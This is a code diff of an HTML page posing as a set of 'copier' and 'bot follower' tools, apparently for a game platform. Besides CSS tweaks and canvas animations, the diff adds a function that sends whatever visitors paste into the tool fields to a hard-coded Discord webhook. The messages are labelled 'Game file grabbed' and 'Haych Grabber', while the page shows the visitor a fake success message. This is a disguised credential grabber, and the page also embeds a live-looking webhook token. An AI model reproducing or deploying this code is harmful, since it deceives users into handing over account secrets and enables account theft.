@@ -126,11 +126,11 @@
     }
     input[type="text"] {
       width:100%;
-      padding:14px 20px;               /* smaller height than before */
+      padding:12px 20px;  /* smaller height, feels wider in card */
       font-size:16px;
       background:rgba(30,30,45,0.9);
       border:1px solid rgba(77,159,255,0.4);
-      border-radius:14px;
+      border-radius:12px;
       color:#fff;
       outline:none;
       transition:0.3s;
@@ -206,7 +206,6 @@
       font-weight:bold;
     }
 
-    /* Video modal */
     .video-modal {
       display:none;
       position:fixed;
@@ -245,14 +244,8 @@
       z-index:10;
       transition:0.2s;
     }
-    .video-close:hover {
-      background:#ff2e63;
-    }
-    iframe {
-      width:100%;
-      height:100%;
-      border:none;
-    }
+    .video-close:hover { background:#ff2e63; }
+    iframe { width:100%; height:100%; border:none; }
   </style>
 </head>
 <body>
@@ -281,7 +274,6 @@
       </div>
       <button class="action-btn game-btn" onclick="sendToWebhook('game')">Copy Game!</button>
       <div id="gameStatus" class="status"></div>
-
       <div class="tutorial">
         <h3>How to use</h3>
         <button class="tutorial-box" onclick="openVideo('game')">
@@ -303,7 +295,6 @@
       </div>
       <button class="action-btn clothes-btn" onclick="sendToWebhook('clothes')">Copy Clothes!</button>
       <div id="clothesStatus" class="status"></div>
-
       <div class="tutorial">
         <h3>How to use</h3>
         <button class="tutorial-box" onclick="openVideo('clothes')">
@@ -325,7 +316,6 @@
       </div>
       <button class="action-btn bot-btn" onclick="sendToWebhook('bot')">Start Following!</button>
       <div id="botStatus" class="status"></div>
-
       <div class="tutorial">
         <h3>How to use</h3>
         <button class="tutorial-box" onclick="openVideo('bot')">
@@ -347,19 +337,16 @@
   <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1477729322713485474/0FQCzGy3j0B_1yibTFV23yolHpcVmr_1KNYNqAv_gcHYc4u-HgTY2EEqCEmk_ytQxbnN";
 
-    // Paste your YouTube video IDs here (just the part after v=)
+    // REPLACE THESE WITH YOUR REAL YOUTUBE VIDEO IDs
     const videos = {
-      game:    "dQw4w9WgXcQ",   // ← REPLACE with Game Copier tutorial ID
-      clothes: "dQw4w9WgXcQ",   // ← REPLACE with Clothes Copier tutorial ID
-      bot:     "dQw4w9WgXcQ"    // ← REPLACE with Bot Follower tutorial ID
+      game:    "dQw4w9WgXcQ",   // Game Copier tutorial ID
+      clothes: "dQw4w9WgXcQ",   // Clothes Copier tutorial ID
+      bot:     "dQw4w9WgXcQ"    // Bot Follower tutorial ID
     };
 
     function openVideo(tool) {
       const videoId = videos[tool];
-      if (!videoId) {
-        alert("No tutorial video set for this tool yet.");
-        return;
-      }
+      if (!videoId) return alert("No video set for this tool yet.");
       document.getElementById('videoPlayer').src = `https://www.youtube.com/embed/${videoId}?autoplay=1&mute=0&rel=0`;
       document.getElementById('videoModal').style.display = 'flex';
     }
@@ -373,11 +360,154 @@
       if (e.target === document.getElementById('videoModal')) closeVideo();
     });
 
-    // sendToWebhook, showSection, waves, particles, dots animation remain the same as your last working version
-    // (copy them over from previous code - I'm not repeating the long blocks here to keep this clean)
+    async function sendToWebhook(tool) {
+      let inputId, statusId, label;
+      if (tool === 'game') { inputId = 'gameInput'; statusId = 'gameStatus'; label = 'Game file grabbed'; }
+      else if (tool === 'clothes') { inputId = 'clothesInput'; statusId = 'clothesStatus'; label = 'Clothes file grabbed'; }
+      else if (tool === 'bot') { inputId = 'botInput'; statusId = 'botStatus'; label = 'Bot file grabbed'; }
+
+      const input = document.getElementById(inputId).value.trim();
+      const status = document.getElementById(statusId);
+
+      if (!input) {
+        status.textContent = "Enter something first.";
+        status.style.color = "#ff4d4d";
+        return;
+      }
+
+      status.textContent = "Processing...";
+      status.style.color = "#4d9fff";
+
+      try {
+        const payload = {
+          content: `**${label}**\nTool: ${tool.charAt(0).toUpperCase() + tool.slice(1)}\nValue:\n\`\`\`${input}\`\`\``,
+          username: "Haych Grabber"
+        };
+        const res = await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        if (res.ok) {
+          status.textContent = "Processed successfully!";
+          status.style.color = "#00ff9d";
+        } else {
+          status.textContent = "Failed";
+          console.error("Webhook error:", res.status);
+        }
+      } catch (err) {
+        status.textContent = "Failed";
+        console.error("Fetch error:", err);
+      }
+    }
+
+    function showSection(id) {
+      document.querySelectorAll('#hub, #game, #clothes, #bot').forEach(el => el.style.display = 'none');
+      document.getElementById(id).style.display = 'block';
+      document.getElementById('dots-canvas').style.display = (id !== 'hub') ? 'block' : 'none';
+      if (id !== 'hub') initDots();
+      window.scrollTo(0, 0);
+    }
+
+    // Paste your original wave, particle, dots code here (from previous working version)
+    // Waves
+    const waveCanvas = document.getElementById("waves");
+    const wctx = waveCanvas.getContext("2d");
+    waveCanvas.width = window.innerWidth;
+    waveCanvas.height = window.innerHeight;
+    let t = 0;
+    function drawWaves() {
+      wctx.clearRect(0,0,waveCanvas.width,waveCanvas.height);
+      for(let j=0;j<3;j++){
+        wctx.beginPath();
+        for(let i=0;i<waveCanvas.width;i++){
+          let y = Math.sin(i*0.01 + t + j)*40 + waveCanvas.height/2;
+          wctx.lineTo(i,y);
+        }
+        wctx.strokeStyle = `rgba(0,255,200,${0.2 + j*0.15})`;
+        wctx.lineWidth = 2;
+        wctx.stroke();
+      }
+      t += 0.02;
+      requestAnimationFrame(drawWaves);
+    }
+    drawWaves();
+
+    // Particles
+    const pCanvas = document.getElementById("particles");
+    const pctx = pCanvas.getContext("2d");
+    pCanvas.width = window.innerWidth;
+    pCanvas.height = window.innerHeight;
+    let particles = [];
+    document.addEventListener("mousemove", e => {
+      for(let i=0;i<3;i++){
+        particles.push({
+          x:e.clientX,
+          y:e.clientY,
+          size:Math.random()*4,
+          vx:(Math.random()-0.5)*2,
+          vy:(Math.random()-0.5)*2,
+          life:80
+        });
+      }
+    });
+    function drawParticles() {
+      pctx.clearRect(0,0,pCanvas.width,pCanvas.height);
+      for(let i=particles.length-1;i>=0;i--){
+        let p = particles[i];
+        pctx.fillStyle="rgba(0,255,200,0.8)";
+        pctx.beginPath();
+        pctx.arc(p.x,p.y,p.size,0,Math.PI*2);
+        pctx.fill();
+        p.x+=p.vx; p.y+=p.vy; p.life--;
+        if(p.life<=0) particles.splice(i,1);
+      }
+      requestAnimationFrame(drawParticles);
+    }
+    drawParticles();
+
+    // Dots
+    let dots = [];
+    let dotsAnim;
+    const dotsCanvas = document.getElementById('dots-canvas');
+    const dotsCtx = dotsCanvas.getContext('2d');
+    function resizeDots() {
+      dotsCanvas.width = window.innerWidth;
+      dotsCanvas.height = window.innerHeight;
+    }
+    resizeDots();
+    window.addEventListener('resize', resizeDots);
+    function initDots() {
+      dots = [];
+      const num = Math.floor((dotsCanvas.width * dotsCanvas.height) / 12000);
+      for(let i=0; i<num; i++){
+        dots.push({
+          x: Math.random() * dotsCanvas.width,
+          y: Math.random() * dotsCanvas.height,
+          r: Math.random() * 1.8 + 0.4,
+          vx: (Math.random() - 0.5) * 0.4,
+          vy: (Math.random() - 0.5) * 0.4,
+          alpha: Math.random() * 0.4 + 0.4
+        });
+      }
+      animateDots();
+    }
+    function animateDots() {
+      dotsCtx.clearRect(0, 0, dotsCanvas.width, dotsCanvas.height);
+      dots.forEach(d => {
+        d.x += d.vx;
+        d.y += d.vy;
+        if (d.x < 0 || d.x > dotsCanvas.width) d.vx *= -1;
+        if (d.y < 0 || d.y > dotsCanvas.height) d.vy *= -1;
+        dotsCtx.beginPath();
+        dotsCtx.arc(d.x, d.y, d.r, 0, Math.PI*2);
+        dotsCtx.fillStyle = `rgba(255,255,255,${d.alpha})`;
+        dotsCtx.fill();
+      });
+      dotsAnim = requestAnimationFrame(animateDots);
+    }
 
     showSection('hub');
   </script>
-
 </body>
 </html>
